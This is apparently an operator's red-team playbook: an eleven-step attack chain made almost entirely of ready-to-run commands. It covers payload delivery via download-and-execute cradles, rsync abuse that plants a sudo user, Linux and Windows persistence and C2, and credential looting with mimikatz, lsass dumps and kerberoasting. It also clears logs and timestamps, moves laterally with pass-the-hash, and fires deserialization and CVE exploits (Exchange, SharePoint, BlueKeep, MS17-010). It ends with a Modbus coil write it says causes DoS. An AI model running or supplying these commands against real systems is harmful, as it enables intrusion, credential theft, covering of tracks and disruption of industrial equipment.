###### 1.) Setup the local attacking machine, spin up a local socks proxy for initial proxychains entry. Forward traffic from redirector back to attacking machine for payload delivery. Spin up services that host the payloads.
```txt
	# setting up, socks, port forwarding for payload delivery
	ssh -f -N -D <LOCALIP>:<LOCALPORT> root@<REMOTEIP> # from local box
	socat TCP-LISTEN:<LOCALPORT>,bind=<LOCALIP>,fork,reuseaddr TCP:<REMOTEIP>:<REMOTEPORT> # from redirector

	# serving via http
	python -m SimpleHTTPServer <LPORT>
	python -c 'import BaseHTTPServer as bhs, SimpleHTTPServer as shs;bhs.HTTPServer(("<LOCALIP>", <LPORT>), shs.SimpleHTTPRequestHandler).serve_forever()'

	# serving via https
	openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
	python -c 'import BaseHTTPServer as BS, SimpleHTTPServer as SS, ssl;httpd=BS.HTTPServer(("<LOCALIP>", <LPORT>), SS.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True);httpd.serve_forever()'
	python python_bits_http_server.py 

	# serving via smb, webdav, tcp
	smbserver.py -ip <LOCALIP> -port <LPORT> -smb2support <SHARENAME> ./
	wsgidav --auth=anonymous --host=<LOCALIP> --port=<LPORT> --root=./
	nc -lvp <LOCALPORT> < payload_to_send.py
```
###### 2.) Prepare for command execution, retrieve remote payloads served by the attacking machine or from compromised machines.	
```txt
	# general command execution
	start /b cmd.exe /c \\<IP>\<SHARE>\<FILE>
	powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>
	powershell -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('<URL>')
	powershell -exec bypass -noninteractive -c iex(iwr '<URL>')
	powershell -exec bypass -noninteractive -c iex(gc \\<IP>\<SHARE>\<FILE>|out-string)

	# wmic xsl, local process, remote node process
	wmic.exe process get brief /format:"https://<URL>/shell.xsl"
	wmic.exe process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
	wmic.exe /node:<TARGETIP> process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"

	# rundll32 jscript, smb, and webdav
	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://<URL>/shell.js")
	rundll32 \\<SMBIP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
	net use p: http://<WEBDAVIP> & rundll32 p:\PowerShdll.dll,main .{iwr -user https://<URL>/shell.ps1}^|iex;

	# inf and sct via http
	cmstp.exe /ni /s https://<URL>/shell.inf
	regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll

	# schtask and at at 08AM
	schtasks /create /s <TARGETIP> /u <DOMAIN>\<USERNAME> /p <PASSWORD> /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "<TASKNAME>" /tr \\<SMBIIP>\<SHARENAME>\shell.exe /sc daily /st 08:00
	at \\<TARGETIP> 08:00 /NEXT: \\<SMBIIP>\<SHARENAME>\shell.exe

	# linux via http, python, bash
	wget -q -O - http://<IP>/shell.py|python -
	curl -s http://<IP>/shell.py|sudo python -
	curl -sv --insecure https://<IP>/shell.sh|bash -

	# mssql xp_cmdshell sp, wmi mof 
	mofcomp.exe -N \\<TARGETIP>\root\subscription .\shell.mof
	xp_cmdshell "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
```
###### 3.) Recon of machines in the DMZ and behind the web-proxy.
```txt
	# host discovery, ping sweep (ttl ~128 = windows)
	nmap -S <SPOOFIP> -oA <NETWORK>_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>

	# generic fingerprinting linux tcp -- rsync, ftp, ssh, telnet, dns, http, rpc, bgp, https,nfs, tomcat, mysql
	proxychains nmap -Pn -oA <NETWORK>_fingerprinting -sT -sV --open -p873,21,22,23,53,80,111,179,443,2049,8009,8080,8443,3306 <NETWORK/CIDR> 

	# generic fingerprinting linux udp -- dhcp, tftp, snmp, vpn
	nmap -S <SPOOFIP> -Pn -oA dmz_udp_fingerprinting -sU -sV --open -p67,68,69,161,162,1194 <NETWORK/CIDR>

	# windows fingerprint -- dns, rpc/dcom, smb/netbios, smb, http(s), rdp, ldap(s), winrm, sccm, mssql 
	proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA <NETWORK>_service_fiingerprint_scan" --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433 <NETWORK/CIDR>
        
	# check http headers, content discovery
	proxychains nmap -v -sT -Pn --script http-headers,http-ntlm-info -T 3 --open -p80,443 -oA <NETWORK>_http_header_scan <NETWORK/CIDR>
	proxychains dirb http(s)://<URL> <DICTIONARY> -o <HOST>_http_folders 
	proxychains dirb http(s)://<URL> <DICTIONARY> -o <HOST>_http_files -X .php,.aspx,.html 
```

###### 4.) Attack the DMZ hosts via rsync.
```txt
	# example rsync, list directory and files 
	proxychains rsync <IP>::
	proxychains rsync <IP>::files
	proxychains rsync -r <IP>::files/home/

	# rsync download shadow file and user folders
	proxychains rsync <IP>::files/etc/shadow .
	proxychains rsync -r <IP>::files/home/admin/

	# create new user, upload folder
	mkdir ./pwn
	proxychains rsync -r ./pwn <IP>::files/home/

	# generate password for shadow, append it to downloaded shadow
	openssl passwd -crypt password123
	echo "pwn:MjHKz4C0Z0VCI:17861:0:99999:7:::" >> ./shadow

	# rsync upload shadow with updated user
	proxychains rsync ./shadow <IP>::files/etc/

	# download, update, upload passwd file 
	proxychains rsync -R <IP>::files/etc/passwd .
	echo "pwn:x:1021:1021::/home/pwn:/bin/bash" >> ./passwd
	proxychains rsync ./passwd <IP>::files/etc/

	# download, update, upload group file
	proxychains rsync -R <IP>::files/etc/group .
	echo "pwn:x:1021:" >> ./group
	proxychains rsync ./group <IP>::files/etc/

	# download, update, upload sudoer file
	proxychains rsync -R <IP>::files/etc/sudoers .
	echo "pwn ALL=(ALL) NOPASSWD:ALL" >> ./sudoers   
	proxychains rsync ./sudoers <IP>::files/etc/

	# connect via ssh
	proxychains ssh pwn@<IP>
```
###### 5.) Persistence, privesc, c2 on compromised Linux system.
```txt
	# payload execution
	nohup curl --insecure -sv https://<IP>/<PAYLOAD>.py|python - & disown
	nohup wget --no-check-certificate -q -O - https://<IP>/<PAYLOADSH>.sh|bash & disown
	curl --insecure https://<IP>/<PAYLOAD> -o <PAYLOAD> && chmod +x <PAYLOAD> && ./<PAYLOAD>
	
	# local enumeration
	curl --insecure https://<IP>/lse.sh -o /tmp/.le_lse.sh && chmod +x /tmp/.le_lse.sh && /tmp/.le_lse.sh -r report -e /tmp/ -t -r /tmp/.le_lse_<REPORTNAME>
	curl --insecure https://<IP>/LinEnum.sh -o /tmp/.le.sh && chmod +x /tmp/.le.sh && /tmp/.le.sh -r report -e /tmp/ -t -r .le_<REPORTNAME>
	proxychains scp pwn@<IP>:/tmp/*le_* . && proxychains ssh pwn@<IP> "rm /tmp/*le_*"
	
	# persistence, c2 via http, post exploitation
	nohup curl --insecure -sv https://<IP>/http_basic_server.py|python - & disown
	curl --insecure https://<IP>/redghost.sh -o /tmp/.rg.sh && chmod +x /tmp/.rg.sh && /tmp/.rg.sh 		
	Payloads
	SudoInject
	lsInject
	SSHKeyInject
	Crontab
	SysTimer
	GetRoot
	Clearlogs
	MassinfoGrab
	CheckVM
	MemoryExec
	BanIP <BLUETEAMIP>
	
	# persistence, post exploitation, alternative
	curl --insecure -sv https://<IP>/rg-nodialog.sh|bash -
	#1 genpayload
	#2 sudowrap 
	#3 injectls 
	#4 keyinject
	#5 cron
	#6 systimer 
	#7 escalate
	#8 clearlog
	#9 info
	#10 checkVM
	#11 memoryexec
	#12 banip		
		
	# proxying traffic, socks server ssh, socks python
	nohup curl --insecure -sv https://<IP>/proxy_server.py|python - & disown
	ssh -f -N -D <IP>:<LPORT> root@<RHOST>
	
	# proxying traffic, webshell php, webshell python fileless
	curl --insecure https://<IP>/tunnel.php -o /var/www/html/<PROXY>.php && chmod +x /var/www/html/<PROXY>.php	
	nohup curl --insecure -sv https://<IP>/tunnel.py|python - & disown
	
	# proxying traffic, icmp to socks
	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
	nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
	
	# local proxy tunnel for icmp, webshell
	attacking machine>python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>	
	attacking machine>python regeorge-v2.py -l <LOCALIP> -p <LPORT> -u http://<IP>/tunnel.php
	# edit proxychains.conf
	localnet 127.0.0.0/255.0.0.0
	socks4 <IP> <PORT> <PASSWORD>

	# maintaining access, root user and SSH
	# passwd root (out of scope)
	adduser <c2_NAME>
	usermod -aG sudo <c2_NAME>
	ssh-keygen -t rsa
	
	# hide commands via path preference
	curl --insecure -sv https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
	# hide from bash commands
	# edit ~/.bashrc's:
	# PATH=/bin/.usr/:${PATH}
	. ./c2_bash_hide.sh && setupPwn

	# lock files, keep password, encrypt 
	for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
	  chattr +i ${f};
	done;
	openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;
	
	# loot credentials
	cat /home/*/.ssh/id*
	cat /tmp/krb5cc_*
	cat /tmp/krb5.keytab
	cat /home/*/.gnupg/secring.gpgs
	cat /home/*/.mysql_history
	cat /home/.bash_history

	# clear timestamps and logs
	for f in `find /var/log/ -type f -name "*" 2>/dev/null`; do
	  echo "" > ${f} 2>&1> /dev/null;
	done;
	for f in `find / -type f -name "*" 2>/dev/null`; do
	  touch ${f} 2>&1> /dev/null;
	done;
	history -c && echo "" > ~/.bash_history
```
###### 6.) Attacking .NET server behind DMZ web-proxy.
```txt
	# grab viewstate info
	proxychains curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &

	# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
	ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

	# test case: 2 – .net < 4.5 and enableviewstatemac=true & viewstateencryptionmode=false
	AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=<VIEWSTATEGENERATOR> --macdecode --legacy

	ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=<VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

	# test case: 3 – .net < 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true, remove __VIEWSTATEENCRYPTED
	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
	  -H 'Connection: keep-alive' \
	  -H 'Content-Type: application/x-www-form-urlencoded' \
	  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
	  -H 'Accept: */*' \
	  -H 'Accept-Language: en-US,en;q=0.9' \
	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<VIEWSTATEBASE64>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1|egrep -i "validation of viewstate mac failed|may be encrypted"

	# test case: 4 – .net >= 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true/false except both attribute to false
	AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

	ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

	# initial access
	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
	  -H 'Connection: keep-alive' \
	  -H 'Content-Type: application/x-www-form-urlencoded' \
	  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
	  -H 'Accept: */*' \
	  -H 'Accept-Language: en-US,en;q=0.9' \
	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
	  
	# with compromised web.configs from internal boxes (alternative)
	proxychains viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
	
	# connect to compromised target via icmp, http, or just tcp...
	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
	python ./windows/windows_icmp_c2.py -shell <REMOTEIP> 
	python ./windows/http_c2.py -ip <REMOTEIP> 
	nc -lvp <LOCALPORT> 
```
###### 7.) Persistence, privesc, c2 on compromised Windows system.
```txt
	# payload execution
	powershell -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('<URL>')
	powershell -exec bypass -noninteractive -c iex(iwr '<URL>')
	start /b cmd.exe /c \\<IP>\<SHARE>\<FILE>	
	powershell -exec bypass -noninteractive -c iex(gc \\<IP>\<SHARE>\<FILE>|out-string)	
	# load modules via icmp (if via http, etc..)
	iex(iwr http(s)://<URL>/icmp_server.ps1); # use 'invoke-shell" to start ICMP C2, see fallback options..
	
	# local enumeration 
	iex(iwr http(s)://<URL>/Invoke-EDRChecker.ps1); invoke-edrchecker
	iex(iwr http(s)://<URL>/HostEnum.ps1); invoke-hostenum -domain -htmlreport
	iex(iwr http(s)://<URL>/SeatBelt.ps1); seatbelt
	\\<IP>\<SHARE>\SeatBelt.exe 
	Survey 
	GetProcess
	GetProcessFull	
	
	# persistence, c2 via icmp, http, post exploitation
	download_file /tmp/web.config c:/inetpub/wwwroot/css/web.config
	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config	
	iex(iwr http(s)://<URL>/icmp_server.ps1); invoke-shell
	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell
	InstallWMIPersistence <EventFilterName> <EventConsumerName>
	SetFallbackNetwork <PRIMARYIP> <IPSUBNET>
	InstallPersistence 1
	InstallPersistence 2
	InstallPersistence 3
	
	# proxying traffic socks, http
	invoke_file /tmp/socks_proxy_server.ps1
	iex(new-object net.webclient).downloadstring('<URL>/socks_proxy_server.ps1')	
	download_file /tmp/tunnel.aspx c:/inetpub/wwwroot/<FILENAME>.aspx
	(new-object net.webclient).downloadstring('<URL>/tunnel.aspx')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\<FILENAME>.aspx

	# maintaining access from icmp c2, migrate to explorer etc..
	invoke_file /tmp/InjectShellcode.ps1
	iex(iwr http(s)://<URL>/InjectShellcode.ps1); 
	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/<PAYLOAD>.ps1')\"" -f  powershell;
	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(gc \\\\<IP>\\<SHARE>\\<PAYLOAD>.ps1\"" -f  powershell;
	Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
	invoke_file /tmp/Invoke-TokenManipulation.ps1
	invoke-tokenmanipulation -createprocess "cmd.exe" -username "<DOMAIN>/<USER>" processargs "/c powershell -exec bypass -noninteractive -e <BASE64>"";

	# downgrade for DES hash, crack DES for NTLM
	invoke_file /tmp/Get-Hash.ps1
	Get-Hash
	invoke-binary /tmp/InternalMonologue.exe

	# kerberoast, loot TGT/TGS
	invoke_file /tmp/Invoke-Kerberoast.ps1
	invoke-kerberoast -domain target.local -outputformat hashcat|select hash
	invoke-binary rubeus.exe triage
	invoke-binary rubeus.exe dump
	
	# loot credentials lsass, lsa secrets
	dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
	invoke_file /tmp/Invoke-Mimikatz.ps1
	Invoke-Mimikatz
	invoke_binary Invoke-Mimikittenz.exe	
	invoke_file /tmp/Invoke-PowerDump.ps1
	Invoke-PowerDump
	
	# lsa secrets via hives
	C:\> reg.exe save hklm\sam c:\temp\sam.save
	C:\> reg.exe save hklm\security c:\temp\security.save
	C:\> reg.exe save hklm\system c:\temp\system.save
	python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
	
	# looting lsass via minidumps, cover tracks
	invoke_file /tmp/Out-Minidump.ps1
	Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
	TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
	download c:\temp\lsass_<PID>.dmp 
	SecureDelete c:\temp\lsass_<PID>.dmp 
	mimikatz # sekurlsa::minidump lsass.dmp
	mimikatz # sekurlsa::logonPasswords full

	# clear logs, disable and redirect rdp 
	foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -logname $_;}
	DisableRDP
	netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=<TARGETPORT> connectaddress=<ATTACKERTIP>

	# hijack rdp, query tscon ID, create service
	query user # find tscon ID, e.g. 1
	sc create rdphijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
	net start rdphijack
	
```	
###### 8.) Lateral movement via Windows and Linux.
```txt
	# ongoing access
	proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
	proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;Bypass-4MSI
	proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains mssqlclient.py -windows-auth -port <PORT> -db <DB> -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<DBIP>;
	proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
	proxychains ssh <USER>@<TARGET>
	proxychains mysql -u <USER> -p <PORT> -h <TARGETIP> -e "select \"<?php echo shell_exec($_GET['cmd']); ?> \" into outfile \"/var/www/html/shell.php\";"

	# windows traffic redirection
	netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
	netsh interface portproxy delete v4tov4 listenport=<PORT> listenaddress=<IP>
	netsh interface portproxy add v6tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
	netsh interface portproxy delete v6tov4 listenport=<PORT> listenaddress=<IP>
	netsh interface portproxy show all

	# linux traffic redirection
	ssh -f -N -L <IP>:<PORT>:<TARGETIP>:<TARGETPORT> <GATEWAYIP>
	socat TCP-LISTEN:<PORT>,bind=<IP>,fork,reuseaddr TCP:<TARGETIP>:<TARGETPORT>
	ssh -f -N -D <IP>:<PORT> root@<GATEWAYIP>
	socat TCP4-LISTEN:445,fork,bind=<IP> SOCKS4:<PROXYIP>:<TARGETIP>:<TARGETPORT>,socksport=<PORT>

	# host discovery andfingerprinting services (icmp proxy?)
	proxychains nmap -oA NETWORK_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>
	proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA NETWORK_service_fiingerprint_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
	proxychains nmap -v --script http-headers -T 3 --open -p80,443 -oA NETWORK_http_header_scan -iL <IPLIST>
	proxychains nmap -v -T 5 -Pn -sT --max-rate 100 --min-rtt-timeout 100ms --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -oA NETWORK_FAST_service_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>

	# domain enumeration via host, using bloodhound
	invoke_file /tmp/Sharphound.ps1
	Invoke-BloodHound -CollectionMethod DCOnly --NoSaveCache --RandomFilenames --EncryptZip
	TimeStomp c:\temp\<BLOODHOUND>.zip "01/03/2008 12:12 pm"
	download c:\temp\<BLOODHOUND>.zip
	SecureDelete c:\temp\<BLOODHOUND>.zip

	# domain enumeration domain via host, using powershell
	invoke_file /tmp/PowerView.ps1
	$boxes=get-netcomputer -domain <DOMAIN> -fulldata
	$boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};

	# enumeration domain via proxy
	proxychains bloodhound-python -c DCOnly -u <USERNAME>@<DOMAIN> --hashes <HASHES> -dc <DCIP> -gc <GCIP> -d <DOMAIN> -v;
	proxychains pywerview.py get-netuser -w <DOMAIN> -u <USER> --hashes <HASHES> -t <DOMAIN> -d <DOMAIN>
	proxychains pywerview.py get-netcomputer -w <DOMAIN> -u <USER> --hashes <HASHES> --full-data --ping -t <DOMAIN> -d <DOMAIN>
	proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USER>
	proxychains rpcdump.py -port 135 <TARGETDC>|grep "MS-RPRN";

	# file share access
	mount -t cifs //<PROXYIP>/<SHARE> /mnt/share -o username=<USER>,password=<PASSWORD>,domain=<DOMAIN>,iocharset=utf8,file_mode=0777,dir_mode=0777
	net share Desktop=c:\users\administrator\desktop /grant:everyone,FULL
	net share Desktop /delete
	net use p: \\<IP>\<SHARE>
	net use p: http:\\<WEBDAVURL>
	net use p: /delete

	# enumerating shares via host for creds and machineKey, powershell
	gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/appSettings/add")}
	gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")}
	gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
	$boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
	foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.config -path "$share"|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")|where key -match pass}}

	# database access
	proxychains mssqlclient.py -port <PORT> -db <DB> <USER>:<PASSWORD>@<IP>
	proxychains mssqlclient.py -windows-auth -no-pass -hashes :<HASH> -dc-ip <DCIP> -port <PORT> -db <DB> <DOMAIN/USER>:<PASSWORD>@<IP>

	# kerberoasting, crack spns
	proxychains GetNPUsers.py -outputfile <TARGET>_spns.txt -no-pass <DOMAIN/USER>
	proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP> <DOMAIN/USER>
	hashcat -m 13100 -a 0 <SPNSFILE> <DICTIONARY> --force
```
###### 9.) Windows domain based privesc, unconstrained.
```txt	
	# find unconstrained delegation objects (computer scenario, sql)
	proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USERNAME>;

	# dump machine NTLM hashes and aes256 key
	proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;

	# add spn via dns (SPN = HOST/PWN-<FQDNOFMACHINE>)
	proxychains addspn.py -u <DOMAIN\\USER> -p <PASSWORDORHASHES> -s <SPN> --additional ldap://<DCFQDN>;

	# add dns via adidns 
	proxychains dnstool.py -u <DOMAIN}\\USER> -p <PASSWORDORHASHES> -r <SPN> -a add -d <ATTACKERIPADDRESS> <DCFQDN>;

	# setup relay to get ticket
	python krbrelayx.py -aesKey <AES256HASH>

	# verify print spool on target dc
	proxychains rpcdump.py -port 135 <TARGETDCFQDN>|grep "MS-RPRN";

	# trigger print spool (SPN you created)
	proxychains printerbug.py -hashes <HASHES> <DOMAIN/USER>@<DCFQDN> <SPN>

	# export ccache to use for ptt
	export KRB5CCNAME=<CACHEOFTGT>

	# dump dc using tgt (use domain admin ntlm hash etc...)
	proxychains secretsdump.py -outputfile <DCFQDN>_hashes -k <DCFQDN> -just-dc;	
```	
	
###### 10.) Scada exploitation.
```txt
	# discover modbus
	proxychains nmap -v -sT -p502 -sV -oA <NETWORK>_modbusscan --open <NETWORK/CIDR>

	# initial access via brute uid
	proxychains python smod.py 
	> use modbus/scanner/uid
	> set RHOSTS <IP>
	> exploit

	# enumeration, get functions
	> use modbus/scanner/getfunc # or > use modbus/scanner/getfunc
	> set RHOSTS <IP>
	> set RPORT 502
	> set UID <UID>
	> exploit

	# read coils
	> use modbus/function/readCoils
	...
	> exploit

	# write coil (will cause DOS!)
	> use modbus/dos/writeSingleCoils
	> show options
	...
	> exploit	
```	
###### 11.) Printer exploitation.
```txt
	# discover ipprinters
	proxychains pret.py
	proxychains nmap -v -sT -p631 -sV -oA <NETWORK>_ippscan --open <NETWORK/CIDR>

	# initial access to ipprinter, accounting bypass (CUPS CVE?)
	proxychains pret.py <IP> pjl
	proxychains snmpset -v1 -c public <IP> 1.3.6.1.2.1.43.5.1.1.3.1 i 6

	# enumeration, generic commands etc.. 
	> env
	> ls ../../
	> put <LFILE>
	> get <RFILE>
	> info config  
	> info memory

	# troll team display message?
	> display "FUNNY MESSAGE ETC"

	# loot memory, fs (sensitive data, creds, etc..)
	> unlock
	> nvram dump 
	> get /etc/shadow

	# pivot ?
	> open <OTHERIP>		
```	
###### 11.) Lateral movement via exploitation.
```txt
	# struts 2-59 exploit 
	proxychains struts_cve-2019-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'

	# exchange exploit
	proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
	proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"

	# sharepoint, command based payload
	proxychains python sharepoint_cve-2019-0604.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -version 2016 -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
	proxychains python sharepoint_cve-2020-0646.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

	# sharepoint, requires editing gadget
	ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
	proxychains python sharepoint_cve-2020-1147.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD>

	# sharepoint sql report, requires editing gadget (needs testing)
	ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" -o base64 
	proxychains python sqlreport_cve_2020-0618.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -payload shell

	# rdp, requires editing shellcode
	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  python
	proxychains python bluekeep_cve-2019-0708.py <IP> 

	# smb3 exploits
	proxychains python3 smbghost_cve-2020-0796.py <TARGETIP> <REVERSEIP> <REVERSEPORT>

	# legacy equation group smb exploits
	proxychains python checker.py <IP>
	proxychains python ms17-010.py -target <IP> -pipe_name samr -command "cmd /c powershell -exec bypass -c iex (new-object system.net.webclient).downloadstring('https://<URL>/implant_auth.ps1')"	
```	
